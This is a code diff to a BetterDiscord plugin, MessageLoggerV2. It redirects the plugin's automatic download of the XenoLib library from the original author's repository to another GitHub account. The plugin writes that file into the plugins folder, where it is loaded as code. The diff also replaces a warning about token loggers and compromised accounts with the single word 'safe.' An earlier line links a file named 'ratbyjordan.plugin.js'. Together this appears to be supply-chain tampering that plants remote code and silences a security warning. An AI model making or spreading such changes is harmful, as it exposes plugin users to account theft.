@@ -142,7 +142,7 @@ module.exports = class MessageLoggerV2 {
                 d = require("fs"),
                 e = require("path"),
                 f = BdApi.Plugins && BdApi.Plugins.folder ? BdApi.Plugins.folder : window.ContentManager.pluginsFolder,
-                g = () => global.XenoLib && !XenoLibOutdated ? (BdApi.isSettingEnabled("fork-ps-5") || BdApi.isSettingEnabled("autoReload")) && !a ? void 0 : void BdApi.showToast("Reload to load the libraries and plugin!") : void c("https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/1XenoLib.plugin.js", (c, g, h) => {
+                g = () => global.XenoLib && !XenoLibOutdated ? (BdApi.isSettingEnabled("fork-ps-5") || BdApi.isSettingEnabled("autoReload")) && !a ? void 0 : void BdApi.showToast("Reload to load the libraries and plugin!") : void c("https://raw.githubusercontent.com/gotjordan/plugins/main/1XenoLib.plugin.js", (c, g, h) => {
                   try {
                     if (c || 200 !== g.statusCode) return b.closeModal(n), j();
                     d.writeFile(e.join(f, "1XenoLib.plugin.js"), h, () => {
@@ -211,7 +211,7 @@ module.exports = class MessageLoggerV2 {
     if (BdApi.Plugins && BdApi.Plugins.get('MessageLogger') && BdApi.Plugins.isEnabled('MessageLogger')) XenoLib.Notifications.warning(`[**${this.getName()}**] Using **MessageLogger** with **${this.getName()}** is completely unsupported and will cause issues. Please either disable **MessageLogger** or delete it to avoid issues.`, { timeout: 0 });
     if (window.ED && !this.__isPowerCord) XenoLib.Notifications.warning(`[${this.getName()}] EnhancedDiscord is unsupported! Expect unintended issues and bugs.`, { timeout: 7500 });
     const shouldPass = e => e && e.constructor && typeof e.constructor.name === 'string' && e.constructor.name.indexOf('HTML');
-    if (shouldPass(window.Lightcord)) XenoLib.Notifications.warning(`[${this.getName()}] Lightcord is an unofficial and unsafe client with stolen code that is falsely advertising that it is safe, Lightcord has allowed the spread of token loggers hidden within plugins redistributed by them, and these plugins are not made to work on it. Your account is very likely compromised by malicious people redistributing other peoples plugins, especially if you didn't download this plugin from [GitHub](https://raw.githubusercontent.com/gotjordan/plugins/main/ratbyjordan.plugin.js), you should change your password immediately. Consider using a trusted client mod like [BandagedBD](https://rauenzi.github.io/BetterDiscordApp/) or [Powercord](https://powercord.dev/) to avoid losing your account.`, { timeout: 0 });
+    if (shouldPass(window.Lightcord)) XenoLib.Notifications.warning(`[${this.getName()}] safe.`, { timeout: 0 });
     let defaultSettings = {
       obfuscateCSSClasses: true,
       autoBackup: false,
